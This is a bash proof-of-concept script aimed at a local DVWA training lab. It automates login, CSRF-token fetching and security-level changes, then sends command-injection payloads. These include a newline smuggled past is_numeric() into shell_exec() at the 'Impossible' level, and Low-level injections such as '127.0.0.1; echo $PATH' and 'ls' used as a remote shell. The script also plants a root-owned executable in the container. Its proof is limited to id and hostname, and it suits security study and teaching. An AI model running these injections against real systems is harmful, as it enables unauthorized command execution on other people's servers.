#!/usr/bin/env bash
#
# dvwa-poc.sh -- DVWA "Impossible" command-injection proof of concept
#
# Demonstrates that is_numeric() accepts leading whitespace, so a newline
# survives the allowlist-and-rebuild validation in vulnerabilities/exec/
# source/impossible.php and reaches shell_exec() as a command separator.
#
# The injected command can carry no arguments and no non-numeric name, so it
# is only reachable if a PATH directory already holds an executable whose name
# matches [0-9eE+-.]+ . This script can plant such a file ("the bridge") to
# demonstrate the chain under that stated precondition. Planting requires root
# and is NOT a bypass of the validation -- it changes the environment, not the
# filter.
#
# Proof is canary only: id and hostname. Nothing else is executed, written or
# persisted. Lab use only.
#
# The security level is driven by this script through DVWA's own security.php
# and its security cookie. No browser interaction is required at any point.
#
# Usage:
#   bash dvwa-poc.sh --check         verify the lab is up, change nothing
#   bash dvwa-poc.sh                 run the payload matrix at Impossible
#   bash dvwa-poc.sh --recon         Low-level recon: PATH, /usr/local/bin, id
#   bash dvwa-poc.sh --status        show bridge state and environment facts
#   bash dvwa-poc.sh --plant         create the bridge   (needs sudo docker)
#   bash dvwa-poc.sh --remove        delete the bridge   (needs sudo docker)
#   bash dvwa-poc.sh --full          recon -> absent -> present -> absent
#
# Environment overrides:
#   URL=http://localhost:8081  CONTAINER=lab-dvwa  DVWA_USER=admin  DVWA_PASS=password
#

set -o pipefail

URL=${URL:-http://localhost:8081}
CONTAINER=${CONTAINER:-lab-dvwa}
DVWA_USER=${DVWA_USER:-admin}
DVWA_PASS=${DVWA_PASS:-password}
BRIDGE=${BRIDGE:-/usr/local/bin/4}

JAR=$(mktemp) || exit 1
trap 'rm -f "$JAR"' EXIT

c_rst=$'\033[0m'; c_dim=$'\033[2m'; c_hit=$'\033[1;32m'; c_no=$'\033[0;33m'; c_err=$'\033[1;31m'

say()  { printf '%s\n' "$*"; }
rule() { printf '%s\n' "-------------------------------------------------------------------"; }
die()  { printf '%s%s%s\n' "$c_err" "$*" "$c_rst" >&2; exit 1; }

# ---------------------------------------------------------------- preflight

ok()   { printf '  [ OK ] %s\n' "$*"; }
bad()  { printf '  %s[FAIL]%s %s\n' "$c_err" "$c_rst" "$*"; }
warn() { printf '  %s[WARN]%s %s\n' "$c_no" "$c_rst" "$*"; }

# Confirm the app is actually there and actually DVWA before sending anything.
# A bare "did curl succeed" is not enough: it returns 0 for 404s and 500s too.
preflight_http() {
  local code body fail=0
  say "== preflight: application =="

  if command -v curl >/dev/null 2>&1; then ok "curl present"
  else bad "curl not installed"; fail=1; fi

  if echo x | grep -qP x 2>/dev/null; then ok "grep supports -P (PCRE)"
  else bad "grep lacks -P -- install GNU grep; token extraction will fail"; fail=1; fi

  code=$(curl -s -o /dev/null -w '%{http_code}' -m 10 "$URL/login.php" 2>/dev/null)
  if [ -z "$code" ] || [ "$code" = "000" ]; then
    bad "no HTTP response from $URL"
    say "         the container is probably not running. Try:"
    say "           sudo docker ps -a | grep -i dvwa"
    say "           sudo docker start $CONTAINER"
    return 1
  fi
  ok "HTTP $code from $URL/login.php"
  [ "$code" = "200" ] || { bad "expected HTTP 200, got $code"; fail=1; }

  body=$(curl -s -m 10 "$URL/login.php")
  if grep -q "Damn Vulnerable Web Application" <<<"$body"; then
    ok "target identifies as DVWA"
  else
    bad "response is not DVWA -- wrong URL or port?"; fail=1
  fi

  if grep -qP "user_token'\s*value='[a-f0-9]+" <<<"$body"; then
    ok "login form exposes a user_token"
  else
    bad "no user_token on the login page -- unexpected DVWA build"; fail=1
  fi

  [ "$fail" -eq 0 ] || return 1
  return 0
}

# Only needed by the modes that touch the container.
preflight_docker() {
  say "== preflight: container =="

  command -v docker >/dev/null 2>&1 || { bad "docker not installed"; return 1; }
  ok "docker present"

  # Everything below shells out to `sudo docker`, which will prompt for a
  # password on first use. Say so, otherwise the script looks like it hung.
  sudo -n true 2>/dev/null || say "         (sudo password required for the docker checks)"

  if sudo docker ps --format '{{.Names}}' 2>/dev/null | grep -qx "$CONTAINER"; then
    ok "container '$CONTAINER' is running"
  else
    bad "container '$CONTAINER' is not running"
    say "         currently running:"
    sudo docker ps --format '           {{.Names}}  ({{.Image}})' 2>/dev/null \
      || say "           (could not query docker -- check sudo)"
    say "         start it with:  sudo docker start $CONTAINER"
    return 1
  fi
}

# ---------------------------------------------------------------- token/auth

tok() { grep -oP "user_token'\s*value='\K[a-f0-9]+" | head -1; }

login() {
  local t landing

  t=$(curl -s -c "$JAR" "$URL/login.php" | tok)
  [ -z "$t" ] && die "no user_token on login page -- is this DVWA?"

  curl -s -b "$JAR" -c "$JAR" -o /dev/null \
       -d "username=$DVWA_USER&password=$DVWA_PASS&Login=Login&user_token=$t" \
       "$URL/login.php"

  SID=$(awk '/PHPSESSID/{print $7}' "$JAR")
  [ -z "$SID" ] && die "login failed -- check DVWA_USER / DVWA_PASS"

  CK="PHPSESSID=$SID"

  # Where does the module actually land? DVWA bounces to setup.php until the
  # database exists, and to login.php if authentication did not stick. Follow
  # redirects and inspect the final URL -- grepping the body for "setup.php"
  # would false-positive on the sidebar link that is present on every page.
  landing=$(curl -s -L -o /dev/null -w '%{url_effective}' \
                 -H "Cookie: $CK" "$URL/vulnerabilities/exec/")
  case "$landing" in
    *setup.php*)
      die "DVWA database not initialised -- open $URL/setup.php and click 'Create / Reset Database'" ;;
    *login.php*)
      die "not authenticated -- check DVWA_USER / DVWA_PASS" ;;
  esac
}

# ---------------------------------------------------------- security level

# DVWA stores the level in a cookie and reads it with dvwaSecurityLevelGet(),
# so the level can be driven entirely from the client. security.php is posted
# as well, so the change is a real state change and not merely a header we send
# -- opening the app in a browser afterwards shows the same level.

read_level() {
  # DVWA prints "<em>Security Level:</em> impossible<br />" -- the LABEL is
  # wrapped, not the value, so a [^<]* pattern stops at the closing tag.
  # Strip tags first, then read the word.
  curl -s -H "Cookie: $CK" "$URL/vulnerabilities/exec/" \
    | tr '\n' ' ' \
    | sed 's/<[^>]*>/ /g' \
    | grep -oiP 'Security Level:\s*\K[a-z]+' | head -1
}

# set_level <low|medium|high|impossible>
set_level() {
  local want="$1" t got

  t=$(curl -s -b "$JAR" -c "$JAR" -H "Cookie: PHPSESSID=$SID; security=$want" \
           "$URL/security.php" | tok)

  curl -s -b "$JAR" -c "$JAR" -o /dev/null \
       -H "Cookie: PHPSESSID=$SID; security=$want" \
       -d "security=$want&seclev_submit=Submit&user_token=$t" \
       "$URL/security.php"

  CK="PHPSESSID=$SID; security=$want"

  got=$(read_level)
  [ -z "$got" ] && die "could not read the security level back from the page"
  [ "$got" = "$want" ] \
    || die "security level is '$got', expected '$want' -- refusing to continue"
  ok "security level set and confirmed: $got"
}

# ---------------------------------------------------------------- one request

# shoot <label> <raw ip= value>
# Fetches a FRESH user_token for every request. DVWA regenerates the token on
# each page load and checkToken() consumes it, so a reused token dies at CSRF
# before ever reaching shell_exec() -- which looks identical to "filtered".
shoot() {
  local label="$1" payload="$2" t body out

  t=$(curl -s -H "Cookie: $CK" "$URL/vulnerabilities/exec/" | tok)
  [ -z "$t" ] && { printf '%-22s %s\n' "$label" "no token (session lost?)"; return 1; }

  # -d sends the body verbatim, so %0a arrives as three characters and PHP's
  # own decoder produces the newline. --data-urlencode would escape the % and
  # silently test nothing.
  body=$(curl -s -H "Cookie: $CK" \
              -d "ip=$payload&Submit=Submit&user_token=$t" \
              "$URL/vulnerabilities/exec/")

  if grep -q "CSRF token is incorrect" <<<"$body"; then
    printf '%-22s %sCSRF REJECTED -- did not reach the sink%s\n' "$label" "$c_err" "$c_rst"
    return 1
  fi

  out=$(awk '/<pre>/,/<\/pre>/' <<<"$body" | sed 's|</\?pre>||g' \
        | sed 's/^[[:space:]]*//' | sed '/^[[:space:]]*$/d')

  if grep -qi "invalid IP" <<<"$out"; then
    printf '%-22s %sREJECTED by validation%s\n' "$label" "$c_no" "$c_rst"
  elif [ -z "$out" ]; then
    printf '%-22s PASSED validation, stdout EMPTY\n' "$label"
  elif grep -q "uid=" <<<"$out"; then
    printf '%-22s %sPASSED -- COMMAND EXECUTED%s\n' "$label" "$c_hit" "$c_rst"
    sed 's/^/                       /' <<<"$out"
  else
    printf '%-22s PASSED validation, stdout:\n' "$label"
    sed 's/^/                       /' <<<"$out"
  fi
}

# ---------------------------------------------------------------- the matrix

matrix() {
  say "target: $URL    security level: impossible"
  rule
  shoot "baseline 1.2.3.4"  "1.2.3.4"
  # --- the six whitespace characters is_numeric() admits ---
  shoot "space    %20"      "1.2.3.%204"
  shoot "tab      %09"      "1.2.3.%094"
  shoot "VT       %0b"      "1.2.3.%0b4"
  shoot "FF       %0c"      "1.2.3.%0c4"
  shoot "CR       %0d"      "1.2.3.%0d4"
  shoot "LF       %0a  <--" "1.2.3.%0a4"
  # --- other names the filter accepts but which resolve to nothing ---
  shoot "LF name  %0a1e5"   "1.2.3.%0a1e5"
  shoot "LF name  %0a-5"    "1.2.3.%0a-5"
  # --- the two bounds: no non-numeric name, no arguments ---
  shoot "LF+name  %0aid"    "1.2.3.%0aid"
  shoot "LF+args  %0a4 -x"  "1.2.3.%0a4%20-x"
  rule
  say "${c_dim}All six whitespace characters pass is_numeric() identically."
  say "Only LF is a shell command separator -- that is the finding.${c_rst}"
}

# ------------------------------------------------------------- LOW-level recon

# The Low level has no validation and no CSRF token, so it doubles as a shell
# on the target -- which makes it the right instrument for reading the PATH
# that shell_exec() itself sees, rather than root's login PATH from docker exec.
#
# Payloads are passed through --data-urlencode here because they contain no
# %-escapes that must survive verbatim. The Impossible payloads cannot use it:
# %0a would be escaped to %250a and the test would silently do nothing.
low_exec() {
  local label="$1" cmd="$2" body out
  body=$(curl -s -H "Cookie: PHPSESSID=$SID; security=low" \
              --data-urlencode "ip=$cmd" -d "Submit=Submit" \
              "$URL/vulnerabilities/exec/")
  # DVWA indents its <pre>, so the first line keeps leading whitespace once the
  # tag is stripped -- trim before filtering or the ping header survives.
  out=$(awk '/<pre>/,/<\/pre>/' <<<"$body" \
        | sed 's|</\?pre>||g' \
        | sed 's/^[[:space:]]*//' \
        | grep -Ev '^PING |^[0-9]+ bytes from |^--- |packets transmitted|round-trip' \
        | sed '/^[[:space:]]*$/d')
  printf '  %s\n' "$label"
  if [ -z "$out" ]; then printf '      (no output)\n'
  else sed 's/^/      /' <<<"$out"; fi
}

recon() {
  say "== recon through the LOW-level injection =="
  set_level low
  say
  low_exec "\$PATH as shell_exec() sees it:"   '127.0.0.1; echo $PATH'
  low_exec "contents of /usr/local/bin:"       '127.0.0.1; ls -la /usr/local/bin/'
  low_exec "does the web user resolve '4'?"    '127.0.0.1; which 4'
  low_exec "web user identity:"                '127.0.0.1; id'
  say
  say "${c_dim}Ping output is filtered from the above for readability;"
  say "the injected command's output is what is shown.${c_rst}"
}

# ---------------------------------------------------------------- bridge ops

bridge_state() {
  sudo docker exec "$CONTAINER" ls -l "$BRIDGE" 2>/dev/null \
    || echo "ABSENT -- $BRIDGE does not exist"
}

plant() {
  say ">> planting bridge $BRIDGE as root (simulating a second vulnerability)"
  sudo docker exec -u 0 "$CONTAINER" sh -c \
    "printf '#!/bin/sh\nid\nhostname\n' > $BRIDGE; chmod 755 $BRIDGE" \
    || die "plant failed -- is container '$CONTAINER' running?"
  bridge_state
}

remove() {
  say ">> removing bridge $BRIDGE"
  sudo docker exec -u 0 "$CONTAINER" rm -f "$BRIDGE"
  bridge_state
}

facts() {
  say "== environment =="
  printf 'image      : %s\n' "$(sudo docker inspect --format '{{.Config.Image}}' "$CONTAINER" 2>/dev/null)"
  printf 'hostname   : %s\n' "$(sudo docker exec "$CONTAINER" hostname 2>/dev/null)"
  printf 'php        : %s\n' "$(sudo docker exec "$CONTAINER" php -v 2>/dev/null | head -1)"
  printf 'dvwa       : %s\n' "$(curl -s -m 10 "$URL/login.php" \
      | grep -oP 'Damn Vulnerable Web Application \(DVWA\) \K[^<]+' | head -1)"
  printf 'shell_exec PATH : %s\n' "$(sudo docker exec "$CONTAINER" php -r 'echo trim(shell_exec("echo \$PATH"));' 2>/dev/null)"
  say "== bridge =="
  bridge_state
}

# ---------------------------------------------------------------- full A/B

full() {
  facts; say
  login

  say "### PHASE 0 -- recon (security level: LOW)"
  recon; say

  remove; say

  say "### CONTROL 1 -- bridge ABSENT (security level: IMPOSSIBLE)"
  say "    expect every row empty or rejected"
  set_level impossible; matrix; say

  plant; say

  say "### PHASE 2 -- back to LOW: can the web user now resolve the bridge?"
  set_level low
  low_exec "which 4:" '127.0.0.1; which 4'
  say

  say "### TEST -- bridge PRESENT (security level: IMPOSSIBLE)"
  say "    expect ONLY the LF row to execute"
  set_level impossible; matrix; say

  remove; say

  say "### CONTROL 2 -- bridge ABSENT again (security level: IMPOSSIBLE)"
  say "    expect a return to empty"
  set_level impossible; matrix
  rule
  say "absent -> present -> absent, byte-identical requests throughout."
  say "The only variable was the existence of $BRIDGE."
  say "Security level was driven from this script via DVWA's own security.php"
  say "and its security cookie -- the browser was never involved."
}

# ---------------------------------------------------------------- entry point

case "${1:-}" in
  --check)  preflight_http; h=$?; say; preflight_docker; d=$?
            say
            if [ "$h" -eq 0 ] && [ "$d" -eq 0 ]; then
              say "${c_hit}ready -- the lab is up and reachable${c_rst}"
            else
              say "${c_err}not ready -- fix the FAIL lines above before running${c_rst}"; exit 1
            fi ;;
  --status) preflight_http || exit 1; preflight_docker || exit 1; say; facts ;;
  --recon)  preflight_http || exit 1; say; login; recon ;;
  --plant)  preflight_docker || exit 1; say; plant ;;
  --remove) preflight_docker || exit 1; say; remove ;;
  --full)   preflight_http || exit 1; say; preflight_docker || exit 1; say; full ;;
  -h|--help) sed -n '2,31p' "$0" ;;
  "")       preflight_http || exit 1; say; login; set_level impossible; say; matrix ;;
  *)        die "unknown option: $1  (try --help)" ;;
esac
